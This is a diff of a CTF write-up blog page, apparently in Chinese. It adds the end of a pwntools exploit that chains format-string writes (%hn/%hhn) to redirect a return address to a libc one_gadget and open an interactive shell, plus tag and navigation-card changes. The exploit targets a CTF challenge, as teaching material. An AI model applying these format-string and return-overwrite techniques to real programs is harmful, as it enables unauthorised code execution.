+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>
+heap_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x2a0</span>
+
+ret <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">8</span>
+ptr <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x18</span>
+rbp <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x10</span>
+
+one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x50a37</span><span class="token punctuation">,</span> <span class="token number">0xebcf1</span><span class="token punctuation">,</span> <span class="token number">0xebcf5</span><span class="token punctuation">,</span> <span class="token number">0xebcf8</span><span class="token punctuation">,</span> <span class="token number">0xebd52</span><span class="token punctuation">,</span> <span class="token number">0xebdaf</span><span class="token punctuation">,</span> <span class="token number">0xebdb3</span><span class="token punctuation">]</span>
+one_gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base
+printf_ret <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token number">0x10</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rbp <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%15$hn\x00'</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget <span class="token operator">>></span> i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%45$hhn\x00'</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>printf_ret <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%15$hn\x00'</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0xb1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%45$hhn\x00'</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="pwnpwn"><a href="#pwnpwn" class="headerlink" title="pwnpwn"></a>pwnpwn</h2><p>漏洞点</p>
 <pre class="line-numbers language-C" data-language="C"><code class="language-C">__int64 add()
 &#123;
     ...
@@ -746,7 +1122,6 @@ delete<span class="token punctuation">(</span><span class="token number">0</span
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
                 
             </div>
             <hr/>
@@ -762,6 +1137,10 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                             
                                 <a href="/tags/heap/">
                                     <span class="chip bg-color">heap</span>
+                                </a>
+                            
+                                <a href="/tags/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+                                    <span class="chip bg-color">非栈上的格式化字符串</span>
                                 </a>
                             
                         </div>
@@ -809,25 +1188,78 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/08/10/2023syctf-computer-fu-xian/2023syctf-computer-fu-xian/">
+                <a href="/2023/08/12/2023-googlectf-ubf/2023-googlectf-ubf/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="2023_syctf_computer_pwn复现">
+                        <img src="/medias/featureimages/25.jpg" class="responsive-img" alt="2023_googlectf_ubf复现">
                         
-                        <span class="card-title">2023_syctf_computer_pwn复现</span>
+                        <span class="card-title">2023_googlectf_ubf复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            2023 syctf computer pwn复现
+                            2023googlectf_ubf复现
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-10
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-12
                         </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/pwn/" class="post-category">
+                                    pwn
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/oob/">
+                        <span class="chip bg-color">oob</span>
+                    </a>
+                    
+                    <a href="/tags/ubf/">
+                        <span class="chip bg-color">ubf</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/08/03/2023-ciscn-pwn-fu-xian/2023-ciscn-pwn-fu-xian/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/29.jpg" class="responsive-img" alt="2023-ciscn-pwn复现">
+                        
+                        <span class="card-title">2023-ciscn-pwn复现</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            2023ciscnb区域半决赛pwn部分复现
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-03
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -847,53 +1279,16 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                         <span class="chip bg-color">heap</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/08/06/2023-syctf-harde-pwn/2023-syctf-harde-pwn/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="2023_syctf_harde_pwn复现">
-                        
-                        <span class="card-title">2023_syctf_harde_pwn复现</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            2023 syctf harde pwn复现
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-06
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/pwn/" class="post-category">
-                                    pwn
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
+                    <a href="/tags/oob/">
+                        <span class="chip bg-color">oob</span>
+                    </a>
                     
-                    <a href="/tags/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
-                        <span class="chip bg-color">非栈上的格式化字符串</span>
+                    <a href="/tags/envp/">
+                        <span class="chip bg-color">envp</span>
+                    </a>
+                    
+                    <a href="/tags/tls/">
+                        <span class="chip bg-color">tls</span>
                     </a>
                     
                 </div>
@@ -1079,7 +1474,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">45.3k</span>&nbsp;字
+                class="white-color">48.8k</span>&nbsp;字
             
             
             
